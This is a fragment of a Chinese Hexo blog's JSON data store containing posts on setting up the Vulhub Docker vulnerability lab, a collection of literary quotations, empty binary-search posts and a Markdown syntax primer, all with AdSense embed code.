https://github.com/vulhub/vulhub.git</span><br></pre></td></tr></table></figure>\n<div style=\"text-align: center;\"><br><div class=\"note success\"><h3 id=\"启动漏洞环境\"><a href=\"#启动漏洞环境\" class=\"headerlink\" title=\"启动漏洞环境\"></a>启动漏洞环境</h3></div><br></div>\n\n<p>docker-compose会自动查找当前目录下的配置文件(默认文件名为docker-compose.xml),并根据其内容编译镜像和启动容器。所以，要运行某个漏洞靶场，需要先进入该漏洞所在的目录。</p>\n<p>在vulhub中选择某个环境，进入对应目录。如Flask服务端模板注入漏洞，我们进入<code>flask/ssti</code>目录，执行如下命令，进行漏洞靶场的编译和运行：<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">cd</span> flask/ssti</span><br><span class=\"line\">docker-compose build</span><br><span class=\"line\">docker-compose up -d</span><br></pre></td></tr></table></figure></p>\n<script async src=\"//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js\"></script>\n<!-- 信息流广告 -->\n<ins class=\"adsbygoogle\" style=\"display:block\" data-ad-client=\"ca-pub-4127326375481893\" data-ad-slot=\"9105526840\" data-ad-format=\"auto\" data-full-width-responsive=\"true\"></ins>\n<script>\n(adsbygoogle = window.adsbygoogle || []).push({});\n</script>","site":{"data":{}},"excerpt":"","more":"<div style=\"text-align: center;\"><br><div class=\"note success\"><h3 id=\"前言\"><a href=\"#前言\" class=\"headerlink\" title=\"前言\"></a>前言</h3></div><br></div>\n\n<p>Vulhub是一个面向大众的开源漏洞靶场，采用docker进行搭建，但是无需docker知识，简单执行两条命令即可编译、运行一个完整的靶场环境。该项目旨在让漏洞复现变得更加简单，让安全研究人员更专注于漏洞本身。</p>\n<div style=\"text-align: center;\"><br><div class=\"note success\"><h3 id=\"安装\"><a href=\"#安装\" class=\"headerlink\" title=\"安装\"></a>安装</h3></div><br></div>\n\n<p>我在Centos7上进行的如下步骤，如果在其他类型的机器上，可以参照进行各个环境的安装</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># 安装git</span></span><br><span class=\"line\">yum install git</span><br><span class=\"line\"><span class=\"comment\"># 安装docker并启动docker</span></span><br><span class=\"line\">yum install docker &amp;&amp; systemctl start docker</span><br><span class=\"line\"><span class=\"comment\"># 安装docker-compose</span></span><br><span class=\"line\">yum install docker-compose</span><br></pre></td></tr></table></figure>\n<p>由于该漏洞环境镜像均来自于Dockerhub/Github/软件官网，所以在国内访问可能会存在速度慢、丢包等问题，导致环境地洞太卡，影响正常使用，请自行解决翻墙问题，或者采用加速器进行加速。</p>\n<p>docker-compose用户组合服务和内网，有的环境涉及到多个容器、端口等，docker-compose可以做到环境的一键化管理，用户不需要再学习各种参数和用法，只需要简单的执行<code>docker-compose up -d</code>即可启动容器环境。</p>\n<p>安装完上述环境之后，可以通过以下命令来下载vulhub环境到任何目录</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">git <span class=\"built_in\">clone</span> https://github.com/vulhub/vulhub.git</span><br></pre></td></tr></table></figure>\n<div style=\"text-align: center;\"><br><div class=\"note success\"><h3 id=\"启动漏洞环境\"><a href=\"#启动漏洞环境\" class=\"headerlink\" title=\"启动漏洞环境\"></a>启动漏洞环境</h3></div><br></div>\n\n<p>docker-compose会自动查找当前目录下的配置文件(默认文件名为docker-compose.xml),并根据其内容编译镜像和启动容器。所以，要运行某个漏洞靶场，需要先进入该漏洞所在的目录。</p>\n<p>在vulhub中选择某个环境，进入对应目录。如Flask服务端模板注入漏洞，我们进入<code>flask/ssti</code>目录，执行如下命令，进行漏洞靶场的编译和运行：<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">cd</span> flask/ssti</span><br><span class=\"line\">docker-compose build</span><br><span class=\"line\">docker-compose up -d</span><br></pre></td></tr></table></figure></p>\n<script async src=\"//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js\"></script>\n<!-- 信息流广告 -->\n<ins class=\"adsbygoogle\" style=\"display:block\" data-ad-client=\"ca-pub-4127326375481893\" data-ad-slot=\"9105526840\" data-ad-format=\"auto\" data-full-width-responsive=\"true\"></ins>\n<script>\n(adsbygoogle = window.adsbygoogle || []).push({});\n</script>"},{"title":"生活-文艺到爆的句子","date":"2018-11-26T09:15:45.000Z","_content":"\n1、我慢慢明白了为什么我不快乐，因为我总是期待一个结果。看一本书期待它让我变得深刻；吃饭、游泳期待它让我一斤斤瘦下；发一条微信期待被回复；对别人好期待被回待以好；写一个故事期待被关注安慰；参加一个活动，期待换来充实丰富的经历；这些预设的期待如果实现了，我就长舒一口气。如果没有实现，就自怨自艾。可是小时候也是同一个我，用一个下午的时间看蚂蚁搬家，等石头开花。小时候不期待结果，小时候的笑哭都不打折。<div style=\"text-align: right\"> ——《允许自己虚度时光》 </div>\n\n2、在一回首间，才忽然发现，原来我一生的种种努力，不过只是为了周遭的人对我满意而已，为了博得他人的称许和微笑，我战战兢兢的将自己套入所有的模式所有的桎梏，走到途中才发现，我只剩下一副模糊的面目，和一条不能回头的路。<div style=\"text-align: right\"> ——席慕蓉《独白》 </div>\n\n3、我确实真诚地喜欢过你，想过带你去看每年故宫的初雪，阿拉斯加的海岸线，我曾愿意与你两人独占一江秋，愿意与你郡亭枕上看潮头，铺着红地毯的礼堂，暮霭沉沉的原野，我都曾愿与你共享，我想想过和你一起生活，直到白发苍苍垂垂老矣，同枕共穴，至死不休。可是我现在确实不喜欢你了，车站年久失修，江南的砖瓦裂了缝，当初不撞南墙不会头的热血已然冷却。抱歉啦，我们就此别过吧，我的喜欢要留给别人了。\n此生勿复见，山水不相逢。<div style=\"text-align: right\"> ——钟意《摘录墙》 </div>\n\n4、从童年起，我便独自一人，照顾着历代的星星。<div style=\"text-align: right\"> ——《孤独》 </div>\n\n5、我不在装模做样的拥有很多朋友，而是回到了孤单之中，以真正的我开始了独自的生活，有时我也会因为寂寞而难以忍受空虚的折磨，但无宁愿以这样的方式来维护自己的自尊，也不愿以耻辱为代价去换取那种表面的朋友。<div style=\"text-align: right\"> ——余华《在细雨中呼喊》 </div>\n\n\n6、太敏感的人会体谅到他人的痛苦，自然就无法轻易做到坦率，所谓的坦率，其实就是暴力。敏感的人会被动性的洞穿对方的难处，就不能无动于衷，总想着为对方分担一些，就算是要委屈自己，往往敏感的人在事情未发生前就提前自我创造了痛苦。所以那些共情能力弱的人，是很自私光明的在幸福着。好想抱一抱每一个因为敏感而变得小心翼翼的人，我懂得他们内心的善良，亦知晓他们的可贵。要好好对待身边敏感且善良的人才好。\n\n\n7、你要知道什么是自己想要的，知道什么是不可逆转的，知道用什么方式实现梦想，知道用什么心情面对苦难，人就在转瞬间感悟，进退得失不离不弃也就都有了答案。我不知道命运会把我带到何方，但是我一直会用善良维护左右。\n\n\n8、上邪，我欲与君相如，长命无绝哀。山无棱，江水为竭。冬雷震震，夏雨雪。天地合，乃敢与君绝。<div style=\"text-align: right\"> ——上邪 </div>\n\n9、我装作老成，人们就传言我老成。我假装是个懒汉，人人就讹传我是懒惰虫。我假装不会写小说，人们就讹传我不会写。我伪装成骗子，人们就说我是个骗子。我充阔，人人以为我是阔佬。我故作冷谈，人人就说我是个无情的家伙。然而，当我真的痛苦万分，不由得呻吟时，人人却认为我是在无病呻吟。<div style=\"text-align: right\"> ——太宰治 </div>\n\n10、我所有的自负都来自我的自卑，所有的英雄气概都来自我内心的软弱，所有的振振有词都因为心中满是怀疑，我假装深情，其实是痛恨自己的无情，我以为人生的意义在于四处游荡流亡，其实只是掩饰至今没有找到可以驻足的地方。<div style=\"text-align: right\"> ——马良《坦白书》 </div>\n\n11、事情往往是这样的，你生了一种病，然后发现导出都是同病者。你丢了一只狗，随后发现满大街都是流浪狗，却都不是你丢的那一只。人的境遇是一种筛子，删选了落到了我们视野的人和事，人一旦掉到了一种境遇里，就会变成吸铁石，把铁屑吸到身边来。<div style=\"text-align: right\"> ——韩松落《鲤.旅馆》 </div>\n\n12、每个人的心中都有一团火，路过的人只看到了烟。但是总有一个人，总有那么一个人能看到这团火，然后走过来，陪我一起。我在人人群中，看到了他的火，然后快步走过去，生怕慢一点他就会被淹没在岁月的尘埃里。我带着我的热情，我的冷漠，我的狂暴，我的温和，以及对爱情的毫无理由的相信，走的上气不接下气。我结结巴巴的对他说：你叫什么名字。从你叫什么名字开始，后来，有了一切。<div style=\"text-align: right\"> ——梵高写提奥的信 </div>\n\n13、我渴望能见你一面，但请你记得，我不会开口见你。这不是因为我骄傲，你知道我在你面前毫无骄傲可言，而是因为，唯有你也想见我的时候，我们见面才有意义。<div style=\"text-align: right\"> ——西蒙波伏娃 </div>\n\n\n<br>\n<br>\n<br>\n\n<script async src=\"//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js\"></script>\n<!-- 信息流广告 -->\n<ins class=\"adsbygoogle\"\n     style=\"display:block\"\n     data-ad-client=\"ca-pub-4127326375481893\"\n     data-ad-slot=\"9105526840\"\n     data-ad-format=\"auto\"\n     data-full-width-responsive=\"true\"></ins>\n<script>\n(adsbygoogle = window.adsbygoogle || []).push({});\n</script>","source":"_posts/生活-文艺到爆的句子.md","raw":"---\ntitle: 生活-文艺到爆的句子\ndate: 2018-11-26 17:15:45\ntags: ['诗意','文艺','美句']\ncategories: 生活\n---\n\n1、我慢慢明白了为什么我不快乐，因为我总是期待一个结果。看一本书期待它让我变得深刻；吃饭、游泳期待它让我一斤斤瘦下；发一条微信期待被回复；对别人好期待被回待以好；写一个故事期待被关注安慰；参加一个活动，期待换来充实丰富的经历；这些预设的期待如果实现了，我就长舒一口气。如果没有实现，就自怨自艾。可是小时候也是同一个我，用一个下午的时间看蚂蚁搬家，等石头开花。小时候不期待结果，小时候的笑哭都不打折。<div style=\"text-align: right\"> ——《允许自己虚度时光》 </div>\n\n2、在一回首间，才忽然发现，原来我一生的种种努力，不过只是为了周遭的人对我满意而已，为了博得他人的称许和微笑，我战战兢兢的将自己套入所有的模式所有的桎梏，走到途中才发现，我只剩下一副模糊的面目，和一条不能回头的路。<div style=\"text-align: right\"> ——席慕蓉《独白》 </div>\n\n3、我确实真诚地喜欢过你，想过带你去看每年故宫的初雪，阿拉斯加的海岸线，我曾愿意与你两人独占一江秋，愿意与你郡亭枕上看潮头，铺着红地毯的礼堂，暮霭沉沉的原野，我都曾愿与你共享，我想想过和你一起生活，直到白发苍苍垂垂老矣，同枕共穴，至死不休。可是我现在确实不喜欢你了，车站年久失修，江南的砖瓦裂了缝，当初不撞南墙不会头的热血已然冷却。抱歉啦，我们就此别过吧，我的喜欢要留给别人了。\n此生勿复见，山水不相逢。<div style=\"text-align: right\"> ——钟意《摘录墙》 </div>\n\n4、从童年起，我便独自一人，照顾着历代的星星。<div style=\"text-align: right\"> ——《孤独》 </div>\n\n5、我不在装模做样的拥有很多朋友，而是回到了孤单之中，以真正的我开始了独自的生活，有时我也会因为寂寞而难以忍受空虚的折磨，但无宁愿以这样的方式来维护自己的自尊，也不愿以耻辱为代价去换取那种表面的朋友。<div style=\"text-align: right\"> ——余华《在细雨中呼喊》 </div>\n\n\n6、太敏感的人会体谅到他人的痛苦，自然就无法轻易做到坦率，所谓的坦率，其实就是暴力。敏感的人会被动性的洞穿对方的难处，就不能无动于衷，总想着为对方分担一些，就算是要委屈自己，往往敏感的人在事情未发生前就提前自我创造了痛苦。所以那些共情能力弱的人，是很自私光明的在幸福着。好想抱一抱每一个因为敏感而变得小心翼翼的人，我懂得他们内心的善良，亦知晓他们的可贵。要好好对待身边敏感且善良的人才好。\n\n\n7、你要知道什么是自己想要的，知道什么是不可逆转的，知道用什么方式实现梦想，知道用什么心情面对苦难，人就在转瞬间感悟，进退得失不离不弃也就都有了答案。我不知道命运会把我带到何方，但是我一直会用善良维护左右。\n\n\n8、上邪，我欲与君相如，长命无绝哀。山无棱，江水为竭。冬雷震震，夏雨雪。天地合，乃敢与君绝。<div style=\"text-align: right\"> ——上邪 </div>\n\n9、我装作老成，人们就传言我老成。我假装是个懒汉，人人就讹传我是懒惰虫。我假装不会写小说，人们就讹传我不会写。我伪装成骗子，人们就说我是个骗子。我充阔，人人以为我是阔佬。我故作冷谈，人人就说我是个无情的家伙。然而，当我真的痛苦万分，不由得呻吟时，人人却认为我是在无病呻吟。<div style=\"text-align: right\"> ——太宰治 </div>\n\n10、我所有的自负都来自我的自卑，所有的英雄气概都来自我内心的软弱，所有的振振有词都因为心中满是怀疑，我假装深情，其实是痛恨自己的无情，我以为人生的意义在于四处游荡流亡，其实只是掩饰至今没有找到可以驻足的地方。<div style=\"text-align: right\"> ——马良《坦白书》 </div>\n\n11、事情往往是这样的，你生了一种病，然后发现导出都是同病者。你丢了一只狗，随后发现满大街都是流浪狗，却都不是你丢的那一只。人的境遇是一种筛子，删选了落到了我们视野的人和事，人一旦掉到了一种境遇里，就会变成吸铁石，把铁屑吸到身边来。<div style=\"text-align: right\"> ——韩松落《鲤.旅馆》 </div>\n\n12、每个人的心中都有一团火，路过的人只看到了烟。但是总有一个人，总有那么一个人能看到这团火，然后走过来，陪我一起。我在人人群中，看到了他的火，然后快步走过去，生怕慢一点他就会被淹没在岁月的尘埃里。我带着我的热情，我的冷漠，我的狂暴，我的温和，以及对爱情的毫无理由的相信，走的上气不接下气。我结结巴巴的对他说：你叫什么名字。从你叫什么名字开始，后来，有了一切。<div style=\"text-align: right\"> ——梵高写提奥的信 </div>\n\n13、我渴望能见你一面，但请你记得，我不会开口见你。这不是因为我骄傲，你知道我在你面前毫无骄傲可言，而是因为，唯有你也想见我的时候，我们见面才有意义。<div style=\"text-align: right\"> ——西蒙波伏娃 </div>\n\n\n<br>\n<br>\n<br>\n\n<script async src=\"//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js\"></script>\n<!-- 信息流广告 -->\n<ins class=\"adsbygoogle\"\n     style=\"display:block\"\n     data-ad-client=\"ca-pub-4127326375481893\"\n     data-ad-slot=\"9105526840\"\n     data-ad-format=\"auto\"\n     data-full-width-responsive=\"true\"></ins>\n<script>\n(adsbygoogle = window.adsbygoogle || []).push({});\n</script>","slug":"生活-文艺到爆的句子","published":1,"updated":"2018-11-29T10:11:18.570Z","_id":"cjpdmv00j000r4cv0negw5xly","comments":1,"layout":"post","photos":[],"link":"","content":"<p>1、我慢慢明白了为什么我不快乐，因为我总是期待一个结果。看一本书期待它让我变得深刻；吃饭、游泳期待它让我一斤斤瘦下；发一条微信期待被回复；对别人好期待被回待以好；写一个故事期待被关注安慰；参加一个活动，期待换来充实丰富的经历；这些预设的期待如果实现了，我就长舒一口气。如果没有实现，就自怨自艾。可是小时候也是同一个我，用一个下午的时间看蚂蚁搬家，等石头开花。小时候不期待结果，小时候的笑哭都不打折。<div style=\"text-align: right\"> ——《允许自己虚度时光》 </div></p>\n<p>2、在一回首间，才忽然发现，原来我一生的种种努力，不过只是为了周遭的人对我满意而已，为了博得他人的称许和微笑，我战战兢兢的将自己套入所有的模式所有的桎梏，走到途中才发现，我只剩下一副模糊的面目，和一条不能回头的路。<div style=\"text-align: right\"> ——席慕蓉《独白》 </div></p>\n<p>3、我确实真诚地喜欢过你，想过带你去看每年故宫的初雪，阿拉斯加的海岸线，我曾愿意与你两人独占一江秋，愿意与你郡亭枕上看潮头，铺着红地毯的礼堂，暮霭沉沉的原野，我都曾愿与你共享，我想想过和你一起生活，直到白发苍苍垂垂老矣，同枕共穴，至死不休。可是我现在确实不喜欢你了，车站年久失修，江南的砖瓦裂了缝，当初不撞南墙不会头的热血已然冷却。抱歉啦，我们就此别过吧，我的喜欢要留给别人了。<br>此生勿复见，山水不相逢。<div style=\"text-align: right\"> ——钟意《摘录墙》 </div></p>\n<p>4、从童年起，我便独自一人，照顾着历代的星星。<div style=\"text-align: right\"> ——《孤独》 </div></p>\n<p>5、我不在装模做样的拥有很多朋友，而是回到了孤单之中，以真正的我开始了独自的生活，有时我也会因为寂寞而难以忍受空虚的折磨，但无宁愿以这样的方式来维护自己的自尊，也不愿以耻辱为代价去换取那种表面的朋友。<div style=\"text-align: right\"> ——余华《在细雨中呼喊》 </div></p>\n<p>6、太敏感的人会体谅到他人的痛苦，自然就无法轻易做到坦率，所谓的坦率，其实就是暴力。敏感的人会被动性的洞穿对方的难处，就不能无动于衷，总想着为对方分担一些，就算是要委屈自己，往往敏感的人在事情未发生前就提前自我创造了痛苦。所以那些共情能力弱的人，是很自私光明的在幸福着。好想抱一抱每一个因为敏感而变得小心翼翼的人，我懂得他们内心的善良，亦知晓他们的可贵。要好好对待身边敏感且善良的人才好。</p>\n<p>7、你要知道什么是自己想要的，知道什么是不可逆转的，知道用什么方式实现梦想，知道用什么心情面对苦难，人就在转瞬间感悟，进退得失不离不弃也就都有了答案。我不知道命运会把我带到何方，但是我一直会用善良维护左右。</p>\n<p>8、上邪，我欲与君相如，长命无绝哀。山无棱，江水为竭。冬雷震震，夏雨雪。天地合，乃敢与君绝。<div style=\"text-align: right\"> ——上邪 </div></p>\n<p>9、我装作老成，人们就传言我老成。我假装是个懒汉，人人就讹传我是懒惰虫。我假装不会写小说，人们就讹传我不会写。我伪装成骗子，人们就说我是个骗子。我充阔，人人以为我是阔佬。我故作冷谈，人人就说我是个无情的家伙。然而，当我真的痛苦万分，不由得呻吟时，人人却认为我是在无病呻吟。<div style=\"text-align: right\"> ——太宰治 </div></p>\n<p>10、我所有的自负都来自我的自卑，所有的英雄气概都来自我内心的软弱，所有的振振有词都因为心中满是怀疑，我假装深情，其实是痛恨自己的无情，我以为人生的意义在于四处游荡流亡，其实只是掩饰至今没有找到可以驻足的地方。<div style=\"text-align: right\"> ——马良《坦白书》 </div></p>\n<p>11、事情往往是这样的，你生了一种病，然后发现导出都是同病者。你丢了一只狗，随后发现满大街都是流浪狗，却都不是你丢的那一只。人的境遇是一种筛子，删选了落到了我们视野的人和事，人一旦掉到了一种境遇里，就会变成吸铁石，把铁屑吸到身边来。<div style=\"text-align: right\"> ——韩松落《鲤.旅馆》 </div></p>\n<p>12、每个人的心中都有一团火，路过的人只看到了烟。但是总有一个人，总有那么一个人能看到这团火，然后走过来，陪我一起。我在人人群中，看到了他的火，然后快步走过去，生怕慢一点他就会被淹没在岁月的尘埃里。我带着我的热情，我的冷漠，我的狂暴，我的温和，以及对爱情的毫无理由的相信，走的上气不接下气。我结结巴巴的对他说：你叫什么名字。从你叫什么名字开始，后来，有了一切。<div style=\"text-align: right\"> ——梵高写提奥的信 </div></p>\n<p>13、我渴望能见你一面，但请你记得，我不会开口见你。这不是因为我骄傲，你知道我在你面前毫无骄傲可言，而是因为，唯有你也想见我的时候，我们见面才有意义。<div style=\"text-align: right\"> ——西蒙波伏娃 </div></p>\n<p><br><br><br><br><br></p>\n<script async src=\"//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js\"></script>\n<!-- 信息流广告 -->\n<ins class=\"adsbygoogle\" style=\"display:block\" data-ad-client=\"ca-pub-4127326375481893\" data-ad-slot=\"9105526840\" data-ad-format=\"auto\" data-full-width-responsive=\"true\"></ins>\n<script>\n(adsbygoogle = window.adsbygoogle || []).push({});\n</script>","site":{"data":{}},"excerpt":"","more":"<p>1、我慢慢明白了为什么我不快乐，因为我总是期待一个结果。看一本书期待它让我变得深刻；吃饭、游泳期待它让我一斤斤瘦下；发一条微信期待被回复；对别人好期待被回待以好；写一个故事期待被关注安慰；参加一个活动，期待换来充实丰富的经历；这些预设的期待如果实现了，我就长舒一口气。如果没有实现，就自怨自艾。可是小时候也是同一个我，用一个下午的时间看蚂蚁搬家，等石头开花。小时候不期待结果，小时候的笑哭都不打折。<div style=\"text-align: right\"> ——《允许自己虚度时光》 </div></p>\n<p>2、在一回首间，才忽然发现，原来我一生的种种努力，不过只是为了周遭的人对我满意而已，为了博得他人的称许和微笑，我战战兢兢的将自己套入所有的模式所有的桎梏，走到途中才发现，我只剩下一副模糊的面目，和一条不能回头的路。<div style=\"text-align: right\"> ——席慕蓉《独白》 </div></p>\n<p>3、我确实真诚地喜欢过你，想过带你去看每年故宫的初雪，阿拉斯加的海岸线，我曾愿意与你两人独占一江秋，愿意与你郡亭枕上看潮头，铺着红地毯的礼堂，暮霭沉沉的原野，我都曾愿与你共享，我想想过和你一起生活，直到白发苍苍垂垂老矣，同枕共穴，至死不休。可是我现在确实不喜欢你了，车站年久失修，江南的砖瓦裂了缝，当初不撞南墙不会头的热血已然冷却。抱歉啦，我们就此别过吧，我的喜欢要留给别人了。<br>此生勿复见，山水不相逢。<div style=\"text-align: right\"> ——钟意《摘录墙》 </div></p>\n<p>4、从童年起，我便独自一人，照顾着历代的星星。<div style=\"text-align: right\"> ——《孤独》 </div></p>\n<p>5、我不在装模做样的拥有很多朋友，而是回到了孤单之中，以真正的我开始了独自的生活，有时我也会因为寂寞而难以忍受空虚的折磨，但无宁愿以这样的方式来维护自己的自尊，也不愿以耻辱为代价去换取那种表面的朋友。<div style=\"text-align: right\"> ——余华《在细雨中呼喊》 </div></p>\n<p>6、太敏感的人会体谅到他人的痛苦，自然就无法轻易做到坦率，所谓的坦率，其实就是暴力。敏感的人会被动性的洞穿对方的难处，就不能无动于衷，总想着为对方分担一些，就算是要委屈自己，往往敏感的人在事情未发生前就提前自我创造了痛苦。所以那些共情能力弱的人，是很自私光明的在幸福着。好想抱一抱每一个因为敏感而变得小心翼翼的人，我懂得他们内心的善良，亦知晓他们的可贵。要好好对待身边敏感且善良的人才好。</p>\n<p>7、你要知道什么是自己想要的，知道什么是不可逆转的，知道用什么方式实现梦想，知道用什么心情面对苦难，人就在转瞬间感悟，进退得失不离不弃也就都有了答案。我不知道命运会把我带到何方，但是我一直会用善良维护左右。</p>\n<p>8、上邪，我欲与君相如，长命无绝哀。山无棱，江水为竭。冬雷震震，夏雨雪。天地合，乃敢与君绝。<div style=\"text-align: right\"> ——上邪 </div></p>\n<p>9、我装作老成，人们就传言我老成。我假装是个懒汉，人人就讹传我是懒惰虫。我假装不会写小说，人们就讹传我不会写。我伪装成骗子，人们就说我是个骗子。我充阔，人人以为我是阔佬。我故作冷谈，人人就说我是个无情的家伙。然而，当我真的痛苦万分，不由得呻吟时，人人却认为我是在无病呻吟。<div style=\"text-align: right\"> ——太宰治 </div></p>\n<p>10、我所有的自负都来自我的自卑，所有的英雄气概都来自我内心的软弱，所有的振振有词都因为心中满是怀疑，我假装深情，其实是痛恨自己的无情，我以为人生的意义在于四处游荡流亡，其实只是掩饰至今没有找到可以驻足的地方。<div style=\"text-align: right\"> ——马良《坦白书》 </div></p>\n<p>11、事情往往是这样的，你生了一种病，然后发现导出都是同病者。你丢了一只狗，随后发现满大街都是流浪狗，却都不是你丢的那一只。人的境遇是一种筛子，删选了落到了我们视野的人和事，人一旦掉到了一种境遇里，就会变成吸铁石，把铁屑吸到身边来。<div style=\"text-align: right\"> ——韩松落《鲤.旅馆》 </div></p>\n<p>12、每个人的心中都有一团火，路过的人只看到了烟。但是总有一个人，总有那么一个人能看到这团火，然后走过来，陪我一起。我在人人群中，看到了他的火，然后快步走过去，生怕慢一点他就会被淹没在岁月的尘埃里。我带着我的热情，我的冷漠，我的狂暴，我的温和，以及对爱情的毫无理由的相信，走的上气不接下气。我结结巴巴的对他说：你叫什么名字。从你叫什么名字开始，后来，有了一切。<div style=\"text-align: right\"> ——梵高写提奥的信 </div></p>\n<p>13、我渴望能见你一面，但请你记得，我不会开口见你。这不是因为我骄傲，你知道我在你面前毫无骄傲可言，而是因为，唯有你也想见我的时候，我们见面才有意义。<div style=\"text-align: right\"> ——西蒙波伏娃 </div></p>\n<p><br><br><br><br><br></p>\n<script async src=\"//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js\"></script>\n<!-- 信息流广告 -->\n<ins class=\"adsbygoogle\" style=\"display:block\" data-ad-client=\"ca-pub-4127326375481893\" data-ad-slot=\"9105526840\" data-ad-format=\"auto\" data-full-width-responsive=\"true\"></ins>\n<script>\n(adsbygoogle = window.adsbygoogle || []).push({});\n</script>"},{"title":"算法-二分查找(上)","date":"2018-11-09T06:30:53.000Z","_content":"\n\n<script async src=\"//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js\"></script>\n<!-- 信息流广告 -->\n<ins class=\"adsbygoogle\"\n     style=\"display:block\"\n     data-ad-client=\"ca-pub-4127326375481893\"\n     data-ad-slot=\"9105526840\"\n     data-ad-format=\"auto\"\n     data-full-width-responsive=\"true\"></ins>\n<script>\n(adsbygoogle = window.adsbygoogle || []).push({});\n</script>","source":"_posts/算法-二分查找-上.md","raw":"---\ntitle: 算法-二分查找(上)\ndate: 2018-11-09 14:30:53\ntags:\ncategories:\n---\n\n\n<script async src=\"//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js\"></script>\n<!-- 信息流广告 -->\n<ins class=\"adsbygoogle\"\n     style=\"display:block\"\n     data-ad-client=\"ca-pub-4127326375481893\"\n     data-ad-slot=\"9105526840\"\n     data-ad-format=\"auto\"\n     data-full-width-responsive=\"true\"></ins>\n<script>\n(adsbygoogle = window.adsbygoogle || []).push({});\n</script>","slug":"算法-二分查找-上","published":1,"updated":"2018-11-29T09:59:50.713Z","_id":"cjpdmv00l000t4cv0z9h6hjda","comments":1,"layout":"post","photos":[],"link":"","content":"<script async src=\"//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js\"></script>\n<!-- 信息流广告 -->\n<ins class=\"adsbygoogle\" style=\"display:block\" data-ad-client=\"ca-pub-4127326375481893\" data-ad-slot=\"9105526840\" data-ad-format=\"auto\" data-full-width-responsive=\"true\"></ins>\n<script>\n(adsbygoogle = window.adsbygoogle || []).push({});\n</script>","site":{"data":{}},"excerpt":"","more":"<script async src=\"//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js\"></script>\n<!-- 信息流广告 -->\n<ins class=\"adsbygoogle\" style=\"display:block\" data-ad-client=\"ca-pub-4127326375481893\" data-ad-slot=\"9105526840\" data-ad-format=\"auto\" data-full-width-responsive=\"true\"></ins>\n<script>\n(adsbygoogle = window.adsbygoogle || []).push({});\n</script>"},{"title":"算法-二分查找(下)","date":"2018-11-09T06:31:00.000Z","_content":"\n\n<script async src=\"//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js\"></script>\n<!-- 信息流广告 -->\n<ins class=\"adsbygoogle\"\n     style=\"display:block\"\n     data-ad-client=\"ca-pub-4127326375481893\"\n     data-ad-slot=\"9105526840\"\n     data-ad-format=\"auto\"\n     data-full-width-responsive=\"true\"></ins>\n<script>\n(adsbygoogle = window.adsbygoogle || []).push({});\n</script>","source":"_posts/算法-二分查找-下.md","raw":"---\ntitle: 算法-二分查找(下)\ndate: 2018-11-09 14:31:00\ntags:\ncategories:\n---\n\n\n<script async src=\"//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js\"></script>\n<!-- 信息流广告 -->\n<ins class=\"adsbygoogle\"\n     style=\"display:block\"\n     data-ad-client=\"ca-pub-4127326375481893\"\n     data-ad-slot=\"9105526840\"\n     data-ad-format=\"auto\"\n     data-full-width-responsive=\"true\"></ins>\n<script>\n(adsbygoogle = window.adsbygoogle || []).push({});\n</script>","slug":"算法-二分查找-下","published":1,"updated":"2018-11-29T09:59:50.713Z","_id":"cjpdmv00n000y4cv0z70inx2u","comments":1,"layout":"post","photos":[],"link":"","content":"<script async src=\"//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js\"></script>\n<!-- 信息流广告 -->\n<ins class=\"adsbygoogle\" style=\"display:block\" data-ad-client=\"ca-pub-4127326375481893\" data-ad-slot=\"9105526840\" data-ad-format=\"auto\" data-full-width-responsive=\"true\"></ins>\n<script>\n(adsbygoogle = window.adsbygoogle || []).push({});\n</script>","site":{"data":{}},"excerpt":"","more":"<script async src=\"//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js\"></script>\n<!-- 信息流广告 -->\n<ins class=\"adsbygoogle\" style=\"display:block\" data-ad-client=\"ca-pub-4127326375481893\" data-ad-slot=\"9105526840\" data-ad-format=\"auto\" data-full-width-responsive=\"true\"></ins>\n<script>\n(adsbygoogle = window.adsbygoogle || []).push({});\n</script>"},{"title":"用Markdown来写文章","date":"2018-09-06T10:39:40.000Z","_content":"\n## Markdown\n\nMarkdown 是一种轻量级标记语言，它允许人们使用易读易写的纯文本格式编写文档，然后转换成丰富的HTML页面。\n\nMarkdown用一些简单的符号标识不同的标题，将某些文章标记为\"**粗体**\"或者*斜体*，下面就来一起学习一下。\n\n\n<br>\n## 语法\n\n**1、标题**\n\n不同的标题采用不等个数的`#`号来进行标记，如下所示：\n\n```Markdown\n# 一级标题\n## 二级标题\n### 三级标题\n#### 四级标题\n```\n\n**2、代码块**\n\n在需要高亮的代码块的前一行及后一行使用三个反引号“\\`”，同时第一行反引号后面表面代码块所使用的语言, 如下：\n\n\\`\\`\\`pyhton\nprint (\"Hello World!\")\n\\`\\`\\`\n\n**3、特殊字符**\n\n```markdown\n**粗体**\n*斜体*\n> 引用内容\n```\n\n\n<br>\n<br>\n<script async src=\"//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js\"></script>\n<!-- 信息流广告 -->\n<ins class=\"adsbygoogle\"\n     style=\"display:block\"\n     data-ad-client=\"ca-pub-4127326375481893\"\n     data-ad-slot=\"9105526840\"\n     data-ad-format=\"auto\"\n     